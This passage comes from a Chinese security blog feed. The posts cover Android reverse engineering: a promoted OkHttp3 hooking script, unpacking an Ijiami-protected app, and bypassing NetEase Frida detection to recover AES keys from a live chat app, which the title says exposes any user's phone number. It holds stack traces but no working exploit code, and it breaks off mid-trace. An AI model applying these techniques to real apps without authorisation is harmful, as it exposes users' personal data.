        <content type="html"><![CDATA[<h1 id="okhttp3-框架介绍"><a href="#okhttp3-框架介绍" class="headerlink" title="okhttp3 框架介绍"></a>okhttp3 框架介绍</h1> <ul><li>android网络框架之OKhttp一个处理网络请求的开源项目,是安卓端最火热的轻量级框架。编写这个脚本的目的是现在多数app试用okhttp3 进行请求 所以我们可以看请求的参数通过这个脚本以后</li></ul><h2 id="脚本界面截图"><a href="#脚本界面截图" class="headerlink" title="脚本界面截图"></a>脚本界面截图</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304071729860.png" alt="脚本界面截图"></p><h2 id="hook脚本演示"><a href="#hook脚本演示" class="headerlink" title="hook脚本演示"></a>hook脚本演示</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304071732636.png" alt="hook脚本演示"></p><h2 id="是否博主原创"><a href="#是否博主原创" class="headerlink" title="是否博主原创"></a>是否博主原创</h2><pre><code> <pre class="language-none"><code class="language-none">是</code></pre></code></pre><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/136</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> original </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爱加密企业版脱壳-方法(依赖定制系统)</title>
      <link href="/androidreverse/2023/03/articles/bb06c9f5435cf86a/"/>
      <url>/androidreverse/2023/03/articles/bb06c9f5435cf86a/</url>
      
        <content type="html"><![CDATA[<h2 id="加固类型"><a href="#加固类型" class="headerlink" title="加固类型"></a>加固类型</h2><ul><li> 整体加固:个人理解 把核心dex加密静态的时候看的是壳子的dex。等app启动的时候通过壳子的dex解密并且运行在内存中运行dex</li><li> 抽取加固:个人理解 把类中的方法体抽空,如果用到这个方法的时候然后回填到方法体中调用完毕以后再次抽空改方法体。</li><li> 要对付这这种抽取加固我们要把类里面的所有方法进行主动调用调用完毕以后在保存dex。大部分时候需要修复dex 为啥要修复 你方法体抽空以后回填的时候总要对每个方法名称和方法体做标记要不你咋知道哪个是那个方法对吧。所以要进行修复使其对应。当然这种需要阅读安卓系统源码找到加载dex的函数。和能可以主动调用合适的函数。然后修改系统源代码编译成系统刷机。</li></ul> <h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><ul><li>查壳是否是安卓报错</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310937812.png" alt="查壳是否是安卓"></p><li>看一下app结构发现是uni-app对于这种发包请求加密可能在js层。发包可能在java层。这种用java层算法定位可能定位不了。当然这种也可以调试一下这不是我们的重点我们是要演示脱壳修复</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310942915.png" alt="查壳app特性发现是uni-app"></p><li>postern+Charles抓包看看请求是否加密</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310949226.png" alt="请求加密了"></p></ul><h2 id="算法定位"><a href="#算法定位" class="headerlink" title="算法定位"></a>算法定位</h2><ul><li>frida 先尝试一java算法定位,可以看到被检测到了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310953552.png" alt="被检测"></p><li>过firda 检测演示 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303310957936.png" alt="过firda检测"></p><li>使用java通杀算法定位一下,aes算法。当然用其他函数也可以定位我就不演示了 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311000487.png" alt="已经定位到"></p><li>使用jadx查找关键函数。查询不到。要不是混淆要不就是加壳了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311003476.png" alt="搜索不到关键函数"></p><li>查壳爱加密企业版利用之前的脱壳工具frida-dexdump 没有脱掉,blackdex直接闪退。所以我们要使用定制系统进行脱壳当然这也不是万能的!!!</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311005627.png" alt="爱加密企业版"></p></ul><h2 id="使用定制系统进行脱壳演示"><a href="#使用定制系统进行脱壳演示" class="headerlink" title="使用定制系统进行脱壳演示"></a>使用定制系统进行脱壳演示</h2><ul><li>先把app安卓到定制系统上然后直接启动app脱壳完毕以后会在指定目录下生成dex文件。当然如果你不用frida 过检测那么你用脱壳系统也会奔溃导致无法脱壳所以。我们需要使用脱壳系统和frida进行配合才可以进行脱壳。脱壳后的结果</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311014905.png" alt="脱壳后的结果"></p><li>脱壳修复 java -jar dexfixer.jar baidu.dex baid.bin baidu.dex 修复后把所有dex打包zip拖到jadx里面 </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311017779.png" alt="修复后打包zip"></p></ul><h2 id="脱壳修复后搜索关键函数"><a href="#脱壳修复后搜索关键函数" class="headerlink" title="脱壳修复后搜索关键函数"></a>脱壳修复后搜索关键函数</h2><ul><li>搜索关键函数搜索到了和我们java hook定位一样</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303311021787.png" alt="搜索函数"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>脱壳系统打造需要对安卓系统和前辈们的脱壳代码和脱壳点进行深入研究。查找更深入的脱壳点这需要花费大量时间和精力去研究。不是一蹴而就的我现在只能照猫画虎还完全不是很理解各个脱壳点的。当然我们渗透测试人员对于这种会点原理会使用工具就行了。我们不是专业的安卓逆向工程师。</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> autoDecoder </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓自动化加解密渗透测试工具autoDecoder-实战演示某聊聊天app获取任意用户手机号</title>
      <link href="/androidreverse/2023/03/articles/85d078fd29af3d21/"/>
      <url>/androidreverse/2023/03/articles/85d078fd29af3d21/</url>
      
        <content type="html"><![CDATA[<h2 id="autoDecoder"><a href="#autoDecoder" class="headerlink" title="autoDecoder"></a>autoDecoder</h2><ul><li>Burp插件，根据自定义来达到对数据包的处理（适用于加解密、爆破等），类似mitmproxy，不同点在于经过了burp中转，在自动加解密的基础上，不影响APP、网站加解密正常逻辑等。<br/>官方地址:https://github.com/f0ng/autoDecoder<br/><p>个人理解:在安卓app请求整体被加密了以后用这个很方便下面例子说明</p></li></ul><h2 id="对测试app进行分析"><a href="#对测试app进行分析" class="headerlink" title="对测试app进行分析"></a>对测试app进行分析</h2><ul><li>使用jadx进行反编看看这个apk</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161014176.png" alt="jadx查看"><br>从上面看不出这个app是什么加固一看是MyApplication 肯定是加固过的</p><li>使用查看工具看看</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161020007.png" alt="发现使用网易易盾进行加加固"></p><li>安装app到手机并且进行抓包</li>   找个可用的手机号验证码注册然后设置密码用账号密码登陆这个app。我已经注册并且设置把密码设置好了。你们自行设置。由于这个app处于运行状态涉及到敏感的地方直接打码如果后续你们遇到的话可以尝试一下。这次测试在于掌握autodecoder插件的使用其他东西我直接略过将讲解一下。想要了解详细的步骤过程后续会在飞机内部群里面讲解如果有人对博客发布文章想要详细步骤什么的。废话不多说开始抓包了。   <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161037237.png" alt="抓包详情"><br>通过抓包可以看到数据加密传输。一开始想用frida自吐算法搞一波说干就干。启动frida server。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161041203.png" alt="附加frida直接奔溃"></p><pre class="language-python" data-language="python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"D:\python3\lib\threading.py"</span><span class="token punctuation">,</span> line <span class="token number">932</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _bootstrap_inner    self<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\threading.py"</span><span class="token punctuation">,</span> line <span class="token number">870</span><span class="token punctuation">,</span> <span class="token keyword">in</span> run    self<span class="token punctuation">.</span>_target<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>_args<span class="token punctuation">,</span> <span class="token operator">**</span>self<span class="token punctuation">.</span>_kwargs<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\application.py"</span><span class="token punctuation">,</span> line <span class="token number">796</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _run    work<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\application.py"</span><span class="token punctuation">,</span> line <span class="token number">394</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _try_start    self<span class="token punctuation">.</span>_start<span class="token punctuation">(</span><span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">139</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _start    self<span class="token punctuation">.</span>_set_autoperform<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_autoperform_option<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">472</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _set_autoperform    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_is_java_available<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"D:\python3\lib\site-packages\frida_tools\repl.py"</span><span class="token punctuation">,</span> line <span class="token number">479</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _is_java_available    script <span class="token operator">=</span> self<span class="token punctuation">.</span>_session<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"java_check"</span><span class="token punctuation">,</span> source<span class="token operator">=</span><span class="token string">"rpc.exports.javaAvailable = () => Java.available;"</span><span class="token punctuation">,</span> runtime<span class="token operator">=</span>self<span class="token punctuation">.</span>_runtime<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida\core.py"</span><span class="token punctuation">,</span> line <span class="token number">26</span><span class="token punctuation">,</span> <span class="token keyword">in</span> wrapper    <span class="token keyword">return</span> f<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>  File <span class="token string">"D:\python3\lib\site-packages\frida\core.py"</span><span class="token punctuation">,</span> line <span class="token number">262</span><span class="token punctuation">,</span> <span class="token keyword">in</span> create_script    <span class="token keyword">return</span> Script<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_impl<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">)</span>frida<span class="token punctuation">.</span>TransportError<span class="token punctuation">:</span> the connection <span class="token keyword">is</span> closed</code></pre><p>我们看sapwn的方式 使用命令frida-ps -Ua  查看包名画红线框的这个就是<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161044636.png" alt="使用命令查看目标app的包名"><br>接下来使用包名启动firda 直接等一会进程就退出了。猜测此肯定检测了frida。并且可能在so层检测。所以我们就要干掉frida检测使用葫芦娃大佬修改版的frida。减少了frida特征但是还是会被检测。思考检测肯定在某个so文件里面的某些个函数进行检测。所以我们通过这个思路可以bypass 对frida的检测干掉检测函数即可。猜测检测可能是网易易盾对frida的检测。本身app代码检测的概率很少。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161046159.png" alt="spawn"></p></ul><h2 id="编写frida-bypass脚本对抗frida检测"><a href="#编写frida-bypass脚本对抗frida检测" class="headerlink" title="编写frida bypass脚本对抗frida检测"></a>编写frida bypass脚本对抗frida检测</h2><ul><li>由于网络某些地方都没有公开放出来检测代码这里仅仅演示bypass效果</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161055081.png" alt="bypass网易易盾的frida检测"></p></ul><h2 id="使用自吐算法脚本定位算法细节"><a href="#使用自吐算法脚本定位算法细节" class="headerlink" title="使用自吐算法脚本定位算法细节"></a>使用自吐算法脚本定位算法细节</h2><ul><li>随便输入一个不存在的手机号显示账号不存在我们配合包就行查找<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161101292.png" alt="通杀算法脚本"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161104707.png" alt="可以看到定位到了加密前的我们提交的数据密文明文上面有我没有截图"><br>放出堆栈信息</p><pre class="language-java" data-language="java"><div class="caption"><span>堆栈信息</span></div><code class="language-java"><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>at <span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span></span>Cipher</span><span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>at com<span class="token punctuation">.</span>xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span></code></pre><p>直接定位算法aes 算法 AES&#x2F;ECB&#x2F;PKCS5Padding 秘钥和key都吐出来了解密一波看看我们<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161110956.png" alt="成功解密证明上述堆栈确实是这个的"></p><p>因为app是有加固的所以我们还是使用脱壳工具进行脱壳这里使用frida-dexdump 测试了一下blackdex貌似脱不全。总之两个工具交替使用吧<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161114762.png" alt="定位key"><br>发现者str2是个字符串那么我们查调用这个加密的<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161118967.png" alt="查找引用"><br>看看n0.b可能就是秘钥点一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161119537.png" alt="查找引用"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161121377.png" alt="定位到确实是用的这个key"><br>接下来这个引用所有的用frida hook一遍看登陆调用了哪些函数。确定以后一级一级的判断。这里我就不用这个hook通杀算法定位了来一个新的既然是 请求和响应都是base64那么他肯定要把字符串转换成字节所以。我们可以hook转换成字节的方法</p></li></ul><h2 id="字节定位分析app请求框架"><a href="#字节定位分析app请求框架" class="headerlink" title="字节定位分析app请求框架"></a>字节定位分析app请求框架</h2><ul><li>定位效果不错<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303161128010.png"></p></li><li><pre class="language-java" data-language="java"><div class="caption"><span>堆栈信息</span></div><code class="language-java">  <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>util<span class="token punctuation">.</span>j<span class="token punctuation">.</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">33</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSTransactionStateUtil</span><span class="token punctuation">.</span><span class="token function">setCrossProcessHeader</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">7</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSHttpsURLConnectionExtension</span><span class="token punctuation">.</span><span class="token generics"><span class="token punctuation">&lt;</span>init<span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">8</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>networkbench<span class="token punctuation">.</span>agent<span class="token punctuation">.</span>impl<span class="token punctuation">.</span>instrumentation<span class="token punctuation">.</span></span>NBSInstrumentation</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">SourceFile</span><span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">11</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">processRequest</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span></span>NetworkDispatcher</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">NetworkDispatcher</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Throwable</span>        at <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String<span class="token punctuation">.</span>Bytes</span><span class="token punctuation">(</span><span class="token class-name">Native</span> <span class="token class-name">Method</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">xxxxx<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span>SecurityUtil</span><span class="token punctuation">.</span><span class="token function">aesEncrypt</span><span class="token punctuation">(</span><span class="token class-name">SecurityUtil</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">3</span><span class="token punctuation">)</span>        at xxxxx<span class="token punctuation">.</span>l<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token class-name">KnowAsynHttpRequestDefEncrypt</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">addBodyIfExists</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">setConnectionParametersForRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>HurlStack</span><span class="token punctuation">.</span><span class="token function">executeRequest</span><span class="token punctuation">(</span><span class="token class-name">HurlStack</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">12</span><span class="token punctuation">)</span>        at <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>android<span class="token punctuation">.</span>volley<span class="token punctuation">.</span>toolbox<span class="token punctuation">.</span></span>BasicNetwork</span><span class="token punctuation">.</span><span class="token function">performRequest</span><span class="token punctuation">(</span><span class="token class-name">BasicNetwork</span><span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">4</span><span class="token punctuation">)</span>        at <span class="token 